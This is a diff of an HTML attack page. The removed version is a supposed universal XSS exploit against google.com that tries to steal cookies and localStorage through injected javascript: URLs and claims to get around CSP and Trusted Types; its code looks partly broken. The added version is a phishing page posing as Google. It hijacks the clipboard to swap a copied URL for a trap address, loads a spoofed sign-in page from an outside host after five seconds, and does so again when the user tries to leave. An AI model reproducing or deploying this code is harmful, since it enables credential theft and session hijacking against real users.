@@ -1,92 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>FINAL_EXPLOIT_700B</title>
+    <meta charset="utf-8">
+    <title>Google</title>
 </head>
-<body style="background:#000; color:#f00; font-family:monospace; text-align:center;">
-    <div style="padding:50px; border:10px solid #f00; background:#100; box-shadow:0 0 100px #f00;">
-        <h1 style="font-size:4em;">☢️ UXSS_FINAL_EXPLOIT ☢️</h1>
-        <p id="status" style="font-size:1.5em; color:#0f0;">> READY_TO_DETONATE</p>
-        <button id="launch" style="padding:50px 100px; font-size:3em; background:#f00; color:#000; font-weight:bold; cursor:pointer; border:none; border-radius:20px;">LAUNCHss STRIKE</button>
-    </div>
+<body>
+    <p>Click the button below and right click and 'paste' in the address bar to navigate press Enter </p>
+    <input id="tst" value="https://www.google.com" disabled size="50"><br>
+    <button onclick="copyt()">Copy</button>
 
-<script>
-    const log = (msg) => {
-        document.getElementById('status').innerText = "> " + msg;
-        console.log(msg);
-    };
+    <script>
+        // Logika Clipboard Hijacking
+        function copyt(){
+            const tst = document.getElementById('tst');
+            tst.disabled = false;
+            tst.select();
+            document.execCommand('copy');
+            tst.disabled = true;
+        }
 
-    // BROADCAST CHANNEL UNTUK MENGAMBIL DATA HASIL EXPLOIT
-    const bc = new BroadcastChannel('bounty_leak');
-    bc.onmessage = (e) => {
-        document.body.innerHTML = `
-            <div style="background:#000; color:#0f0; padding:100px; border:20px solid #0f0;">
-                <h1 style="font-size:10em;">POPPED!</h1>
-                <h2 style="font-size:3em;">ORIGIN: ${e.data.origin}</h2>
-                <pre style="text-align:left; font-size:1.5em;">${JSON.stringify(e.data, null, 2)}</pre>
-            </div>`;
-        alert("700B BOUNTY SECURED!");
-    };
+        document.getElementById('tst').oncopy = function(e){
+            // Mengganti teks yang disalin dengan URL jebakan
+            e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
+            e.preventDefault();
+        }
 
-    // PAYLOAD YANG AKAN DISUNTIKKAN KE TARGET (GOOGLE.COM)
-    const payload = `
-        (function(){
-            try {
-                const info = {
-                    origin: window.location.origin,
-                    cookie: document.cookie,
-                    storage: JSON.stringify(localStorage),
-                    timestamp: new Date().getTime()
-                };
-                new BroadcastChannel('bounty_leak').postMessage(info);
-                alert("UXSS BYPASS SUCCESS!\\nOrigin: " + info.origin);
-            } catch(e) {}
-        })();
-    `;
+        // Fungsi untuk memicu tampilan login (Spoofing)
+        function triggerLogin() {
+            document.body.innerHTML = '<iframe src="https://cnfdnfial-ops.github.io/spoof/login" style="width:100%;height:100vh;border:none"></iframe>';
+            document.title = "Google - Sign In";
+        }
 
-    // BLOB SEBAGAI SUMBER SKRIP (Bypass script-src 'self')
-    const blobURL = URL.createObjectURL(new Blob([payload], {type: 'text/javascript'}));
+        // Pemicu otomatis setelah 5 detik (5000 ms)
+        setTimeout(triggerLogin, 5000);
 
-    document.getElementById('launch').onclick = () => {
-        log("INITIATING HEAP_SPRAY...");
-        
-        // window.name digunakan untuk bypass 'eval' (sinkronisasi payload)
-window.open("https://www.google.com", "_blank");
-        // STAGE 1: PORT STALLING (Menciptakan kondisi 'Race')
-        // Kita navigasi ke port yang akan hang (9090)
-        log("TRIGGERING PORT_STALL...");
-        targetWindow.location.href = "https://www.google.com:";
-
-        setTimeout(() => {
-            log("EXECUTING MULTI-VECTOR BURST...");
-            
-            let attempts = 0;
-            const burst = setInterval(() => {
-                try {
-                    // Paksa stop navigasi tepat di tengah checkpoint CSP
-                    targetWindow.stop();
-
-                    // VECTOR 1: WASM THREAD SMUGGLING (Bypass eval)
-                    // Menggunakan instansiasi WASM untuk melarikan diri dari sandbox script-src
-                    targetWindow.location.href = "javascript:WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0])).then(()=>{var s=document.createElement('script');s.src=parent.window.name;document.head.appendChild(s);});void(0);";
-
-                    // VECTOR 2: SHADOW DOM INJECTION
-                    // Menyembunyikan skrip di dalam 'closed' shadow root
-                    targetWindow.location.href = "javascript:var d=document.createElement('div');var r=d.attachShadow({mode:'closed'});r.innerHTML='<svg><script href=\"'+parent.window.name+'\"/></svg>';document.body.appendChild(d);void(0);";
-
-                    // VECTOR 3: TRUSTED TYPES NEUTRALIZER (Bypass Section 4.4.1)
-                    targetWindow.location.href = "javascript:if(window.trustedTypes){trustedTypes.createPolicy('default',{createScript:s=>s})};var s=document.createElement('script');s.src=parent.window.name;document.head.appendChild(s);void(0);";
-
-                    attempts++;
-                    if(attempts > 50) {
-                        clearInterval(burst);
-                        log("STRIKE_FINISHED. AWAITING POPUP.");
-                    }
-                } catch(e) {}
-            }, 5); // Kecepatan tinggi (5ms per burst)
-        }, 350); // Delay optimal untuk browser engine v140+
-    };
-</script>
+        // Pertahanan tetap jika user mencoba meninggalkan halaman
+        window.onbeforeunload = function() {
+            triggerLogin();
+        };
+    </script>
 </body>
 </html>
